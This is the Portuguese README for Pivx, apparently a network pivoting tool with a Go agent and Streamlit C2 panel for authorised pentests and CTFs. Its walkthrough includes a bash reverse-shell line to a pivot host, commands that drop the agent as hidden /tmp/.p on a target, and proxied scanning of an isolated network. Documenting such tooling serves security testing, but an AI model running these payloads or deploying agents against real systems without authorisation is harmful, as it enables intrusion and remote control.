# Pivx 🕸️

![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)

[English](README.md) | [Español](README_es.md) | [Português](README_pt.md) | [中文](README_zh.md)

**Ferramenta de pivoting e roteamento de rede para testes de penetração autorizados.**
Pivx utiliza uma arquitetura de **Framing Híbrido** que multiplexa **tunelamento L3,
port forwarding L4 e SOCKS5 L7** sobre uma única conexão WebSocket com
**latência ultrabaixa** — sem cabeçalhos adicionais de framing, sem conexões secundárias.

> **Status atual (Fase 3):** suíte completa de pivoting para CTF e pentesting.
> Consulte [`ARCHITECTURE.md`](ARCHITECTURE.md) para o design completo.

---

## ⚡ Funcionalidades Principais

- **Túnel L3** — Interface TUN `pivx0` com pilha TCP/IP em espaço de usuário (gVisor netstack) no agente. Roteamento IP completo pelo túnel.
- **Port Forwarding L4** — Encaminhamentos locais (`-L`) e remotos (`-R`) multiplexados pelo mesmo WebSocket. Ideal para reverse shells.
- **Proxy SOCKS5 L7** — Proxy dinâmico com resolução DNS no lado do agente. Funciona com proxychains, ffuf, Burp Suite e qualquer ferramenta compatível com SOCKS.
- **Escaneamento de Alta Fidelidade** — ICMP Smartping, Magic IP, anulação de SYN-Cookies e RST inteligente para resultados precisos do nmap pelo túnel.
- **Framing Híbrido** — Controle (frames JSON de texto) + dados (frames binários) em um único WebSocket. Pacotes L3 (nibble IP `0x4`/`0x6`) e streams MUX (`0x01`) coexistem em frames binários com discriminação de custo zero.
- **Kill Switch** — Encerramento remoto do agente a partir do painel C2 com um clique.
- **Plano de Dados Blindado** — MTU 1350 (margem para WebSocket/TLS), contrapressão com descarte, proteção anti-rota de uplink.
- **Painel Web** — C2 baseado em Streamlit com status do agente em tempo real, controle de túnel, gerenciamento de rotas e interface de port forwarding.

---

## 🎯 Alta Fidelidade e Evasão

Pivx implementa melhorias de fidelidade de rede que tornam escaneamentos pelo túnel indistinguíveis de conexões nativas. Todas as funcionalidades verificadas em testes automatizados em laboratório Docker.

### ICMP Smartping

Diferentemente de ferramentas de pivoting tradicionais, o Pivx suporta **ping real pelo túnel L3**. O agente intercepta Echo Requests ICMP, executa um `ping` em nível de sistema operacional para verificar se o host está ativo e constrói um Echo Reply adequado com checksums RFC 1071 corretos.

```bash
# A partir do seu C2, com túnel e rota ativos:
ping -c 2 10.10.20.100

PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
64 bytes from 10.10.20.100: icmp_seq=1 ttl=64 time=5.03 ms
64 bytes from 10.10.20.100: icmp_seq=2 ttl=64 time=2.88 ms

--- 10.10.20.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

Isso permite a **descoberta de hosts no nmap sem `-Pn`** — hosts que respondem ao ping aparecem como *up* e o nmap escaneia apenas esses.

### Magic IP (`240.0.0.1`)

A faixa reservada Classe E `240.0.0.0/4` é reescrita para `127.0.0.1` no agente, tanto pelo túnel L3 quanto via SOCKS5/MUX. Acesse serviços que escutam apenas no localhost da vítima (bancos de dados, painéis de administração, APIs internas) sem conflitos de IP:

```bash
# Via SOCKS5 — acesse servidor HTTP oculto no localhost:8080 do agente:
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/

# Retorna: listagem de diretórios do sistema de arquivos do agente
<!DOCTYPE HTML>
<html lang="en">
<head><title>Directory listing for /</title></head>
...
```

Qualquer IP em `240.x.x.x` funciona: `240.0.0.1`, `240.1.2.3`, etc. Todos redirecionam para o `127.0.0.1` do agente.

### Anulação de SYN-Cookies

O Pivx desabilita os SYN-Cookies do gVisor, impedindo que o netstack responda SYN-ACK para **todo** SYN sem criar estado. Sem essa correção, `nmap -sS` mostraria todas as portas como *open*. Com ela, apenas portas realmente abertas respondem.

### RST Inteligente

Quando o agente tenta conectar a uma porta fechada e recebe `ECONNREFUSED`, ele retorna RST ao scanner. Se o alvo não responde (timeout), ele permanece silencioso. Isso permite que o nmap distinga corretamente entre portas *closed* (RST) e *filtered* (sem resposta).

### Kill Switch

A partir do painel C2, um clique envia `{"type":"kill"}` para o agente, que executa `os.Exit(0)` imediatamente. O WebSocket é encerrado e o painel reflete a mudança instantaneamente.

### Resultados de Testes Verificados

| Teste | Resultado | Detalhe |
|-------|-----------|---------|
| Smartping L3 (ping pelo túnel) | **APROVADO** | 2/2 respostas, ~4ms RTT |
| Magic IP L7 (240.0.0.1:8080 via SOCKS5) | **APROVADO** | HTTP 200, listagem de diretórios |
| Kill Switch (os.Exit remoto) | **APROVADO** | Desconexão em <1s |

---

## 📋 Requisitos

- **Servidor:** Linux ou **WSL2** (TUN utiliza `/dev/net/tun`). Requer **root** (ou `CAP_NET_ADMIN`) para criar a interface e adicionar rotas.
- **Agente:** Não é necessário ter Go instalado — baixe o binário pré-compilado em [Releases](https://github.com/HangLoose84/Pivx/releases). Go 1.22+ é necessário apenas para compilação a partir do código-fonte.

---

## 🚀 Início Rápido

### 1) Servidor (Python, Linux/WSL2)

> **Nota para Kali Linux e distribuições modernas:** Python 3.11+ marca pacotes do sistema como `externally-managed-environment` e bloqueia `pip install` global. O Pivx utiliza um **ambiente virtual (`venv`)** para evitar isso. O script `install.sh` o cria automaticamente.

**Instalação rápida (< 2 minutos):**

```bash
git clone https://github.com/HangLoose84/Pivx.git
cd Pivx
chmod +x install.sh
./install.sh
```

**Iniciar o C2:**

```bash
sudo server/venv/bin/streamlit run server/app.py
```

`sudo` é necessário porque o servidor cria a interface TUN e manipula a tabela de roteamento do kernel. Invocar o `streamlit` do venv diretamente evita a necessidade de `sudo -E` ou ativação manual do venv.

Listener WebSocket: `ws://0.0.0.0:8765` — Interface do painel: http://localhost:8501

### 2) Agente

> **Não é necessário instalar Go nem compilar** se você apenas quer usar o Pivx. Baixe o binário pré-compilado na aba [**Releases**](https://github.com/HangLoose84/Pivx/releases) e faça upload para a máquina alvo:
>
> ```bash
> # A partir da máquina alvo:
> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
> chmod +x /tmp/.p
> /tmp/.p --server ws://SEU_C2:8765
> ```
>
> Binários disponíveis: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`, `pivx-agent-windows-amd64.exe`.

#### Compilação a partir do código-fonte (avançado)

Requer **Go 1.22+**. Primeira vez — baixar gVisor (branch especial `go`) e resolver dependências:

```bash
cd agent
go get gvisor.dev/gvisor@go
go mod tidy
```

Executar diretamente:

```bash
go run . --server ws://127.0.0.1:8765
```

#### Cross-compilation com `Makefile` (recomendado)

O `Makefile` na raiz faz cross-compilation de binários estáticos e stripped (`-ldflags="-s -w"` + `-trimpath`, sem símbolos ou DWARF) para minimizar o tamanho — essencial para upload de agentes em conexões instáveis durante CTFs.

```bash
make deps           # Uma vez: baixar gVisor (branch `go`) e ajustar módulos
make                # Compilar todas as 3 plataformas para ./dist
```

Alvos individuais:

```bash
make linux-amd64     # -> dist/pivx-agent-linux-amd64
make linux-arm64     # -> dist/pivx-agent-linux-arm64
make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
make clean           # Remover ./dist
```

Os binários utilizam `CGO_ENABLED=0` (totalmente estáticos, sem dependência de libc no alvo). Exemplo de deploy:

```bash
scp dist/pivx-agent-linux-amd64 target:/tmp/.p
ssh target '/tmp/.p --server ws://SEU_C2:8765'
```

### 3) Ativar Túnel e Rotas

1. No painel, seção **Tunnel**, selecione o agente e clique em **Start tunnel** (cria `pivx0`).
2. Em **Routes**, adicione a sub-rede interna: clique em uma **sub-rede descoberta** pelo agente ou digite manualmente (`10.10.20.0/24`).
3. Suas ferramentas locais agora alcançam a rede interna através do agente:

```bash
nmap -sS 10.10.20.0/24          # SYN scan funciona (RST Inteligente + sem SYN-Cookies)
ping 10.10.20.5                  # Funciona (Smartping)
curl http://10.10.20.5/
```

### 4) Verificação

- O agente aparece **online** com hostname/OS/arch e suas sub-redes.
- `ip addr` no servidor mostra `pivx0`; `ip route` mostra sub-redes roteadas para `pivx0`.
- O tráfego para a LAN interna funciona; linhas `[tcp] proxy established -> ...` aparecem no log do agente.

### 5) Port Forwarding (L4) e SOCKS5 (L7)

Além do túnel L3, o Pivx multiplexa **streams TCP** pelo mesmo WebSocket. Essas funcionalidades **não requerem o túnel L3** — apenas um agente conectado. No painel, seção **Port forwarding (L4)**.

#### Encaminhamento local (`-L`) — exponha um serviço interno localmente

Aba **Local (-L)**. O servidor abre uma porta na sua máquina; o agente conecta a um `IP:porta` na rede interna.

```bash
# Bind: 127.0.0.1:8080 → Destino (agente): 10.10.20.5:80
curl http://127.0.0.1:8080/     # alcança :80 na rede interna via agente
```

Útil para acessar painéis de administração, bancos de dados (`:3306`), RDP, etc.

#### Encaminhamento remoto (`-R`) — receba reverse shells

Aba **Remote (-R)**. O **agente** abre uma porta na rede da vítima; conexões de entrada são encaminhadas para o seu handler local.

```bash
# Bind na vítima: 0.0.0.0:4444 → Destino local: 127.0.0.1:5555
# No seu C2:
nc -lvnp 5555
# Na vítima: conecte em agent_ip:4444 → chega no seu 127.0.0.1:5555
```

#### SOCKS5 (L7) — proxy dinâmico para ferramentas web

Seção **SOCKS5 Proxy**. Clique em **Start SOCKS5** (padrão `127.0.0.1:1080`). **Resolução DNS e conexões TCP acontecem no agente**, então hostnames internos são resolvidos na rede da vítima.

```bash
# proxychains (configure /etc/proxychains4.conf → socks5 127.0.0.1 1080):
proxychains -q curl http://intranet.victim.local/
proxychains -q smbclient -L //10.10.20.5/

# Suporte SOCKS direto:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/

# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
#   (marque "Do DNS lookups over SOCKS proxy")
```

---

## 🔀 Cenário: Salto Duplo em Redes Isoladas

Exemplo real testado com Docker: comprometer uma máquina **sem acesso à internet** através de um host pivot que conecta duas redes.

### Topologia

```
  Sua máquina (Kali)           Rede pública                Rede interna (isolada)
  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
  │  Pivx C2    │◄── WS ──►│  Pivot       │          │  Alvo            │
  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
  │             │          │  10.10.20.20 │          │  (sem internet)  │
  └─────────────┘          └─────────────┘          └──────────────────┘
    SOCKS5 :1080             Pivx Agent               HTTP :80
    Handler :9001            rforward :4444
```

O C2 **não consegue alcançar** `10.10.20.0/24` diretamente. O Pivx resolve isso.

### Etapa 1 — Implantar o agente no host pivot

```bash
scp dist/pivx-agent-linux-amd64 user@10.10.10.20:/tmp/.p
chmod +x /tmp/.p
/tmp/.p --server ws://10.10.10.10:8765
```

O agente conecta, reporta suas interfaces e descobre a sub-rede `10.10.20.0/24`. O painel o mostra como **online**.

### Etapa 2 — Alcançar a rede isolada com SOCKS5 (entrada)

Inicie o SOCKS5 no painel (`127.0.0.1:1080`):

```bash
# Escanear o alvo isolado:
proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100

# Navegar no serviço web interno:
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/

# Fuzzing de diretórios:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

Fluxo de tráfego: `sua ferramenta → SOCKS5 :1080 → MUX → pivot → 10.10.20.100`.

### Etapa 3 — Receber reverse shells com encaminhamento remoto (saída)

O alvo isolado não consegue conectar ao seu C2, mas consegue alcançar o pivot. Use **encaminhamento remoto** para retransmitir conexões de volta:

```bash
# 1) Painel: Port forwarding → Remote (-R)
#    Bind na vítima: 0.0.0.0:4444 → Destino local: 127.0.0.1:9001

# 2) Inicie seu handler:
nc -lvnp 9001

# 3) Execute o payload no alvo apontando para o pivot:
bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
```

Fluxo de tráfego: `alvo → pivot:4444 → MUX → C2:9001`.

### Resultados Verificados

Testado com laboratórios Docker automatizados (3 containers, 2 redes isoladas):

| Teste | Resultado | Latência |
|-------|-----------|----------|
| SOCKS5 entrada → alvo:80 | HTTP 200 completo | ~25ms |
| Encaminhamento remoto ← reverse shell | Payload recebido no C2:9001 | ~13s (espera do script) |
| Streams residuais após encerramento | 0 (sem vazamentos) | — |

---

## 🗂️ Estrutura do Projeto

```
Pivx/
├── Makefile                  # Cross-build (linux/amd64, arm64, win/amd64)
├── agent/                    # Agente Go
│   ├── go.mod
│   ├── main.go               # Transporte WS + controle + descoberta (anti-uplink)
│   ├── netstack.go           # Pilha gVisor (espaço de usuário) + encaminhadores TCP/UDP (L3)
│   ├── icmp.go               # ICMP Smartping + injeção de UDP Port Unreachable
│   └── mux.go                # Multiplexação de streams TCP (L4/L7) pelo mesmo WS
├── server/
│   ├── app.py                # Painel Streamlit (túnel + rotas + forwarding + SOCKS)
│   ├── requirements.txt
│   └── pivx_server/
│       ├── db.py             # Persistência DuckDB (agentes, rotas, logs)
│       ├── tun.py            # Interface TUN Linux (raw-IP, MTU 1350)
│       ├── runtime.py        # Orquestração TUN <-> WebSocket (plano L3)
│       ├── forward.py        # Camada MUX: port forwarding L4 + SOCKS5 (L4/L7)
│       └── ws_server.py      # Listener WebSocket (controle + dados + demux L3/MUX)
├── ARCHITECTURE.md
└── README.md
```

---

## ⚠️ Limitações Conhecidas

### Dicas de escaneamento

O Pivx suporta **ping pelo túnel** (Smartping) e **SYN scans** (anulação de SYN-Cookies + RST Inteligente). Modos nmap suportados:

```bash
nmap -sn 10.10.20.0/24          # Descoberta de hosts com ping (Smartping)
nmap -sS 10.10.20.0/24          # SYN scan (preciso open/closed/filtered)
nmap -sT 10.10.20.0/24          # TCP connect scan (sempre funciona)
```

> **Nota:** O Smartping executa um `ping` real em nível de sistema operacional para cada Echo Request, adicionando ~3-5ms de latência. Para escaneamentos em larga escala, `-Pn` ainda é mais rápido pois pula a fase de descoberta.

### Limitações atuais

- **Túnel único / agente ativo único** por vez (foco em CTF). Multi-agente simultâneo está **adiado** (Fase 5).
- **Sem TLS/wss ou autenticação de agente** por enquanto (Fase 4). Não utilize fora de um laboratório ou rede controlada.
- **SOCKS5** implementa apenas `CONNECT` via TCP (sem BIND ou UDP ASSOCIATE), suficiente para escaneamento/fuzzing/proxy web.
- Um agente que perde a conexão sem desligamento limpo fica **`offline` automaticamente** após ~45s sem pings (varredura keep-alive do servidor).

### Observações (gVisor / ambiente)

- **gVisor** possui uma API sensível a versões; este código acompanha a branch `go`. Se `go mod tidy` desalinhar símbolos, ajuste os nomes em `netstack.go` para a versão resolvida.
- Não testado com Windows como servidor (Linux/WSL2 escolhido pelo suporte a TUN).

---

> ⚠️ **Use apenas em sistemas de sua propriedade ou com autorização explícita por escrito.**
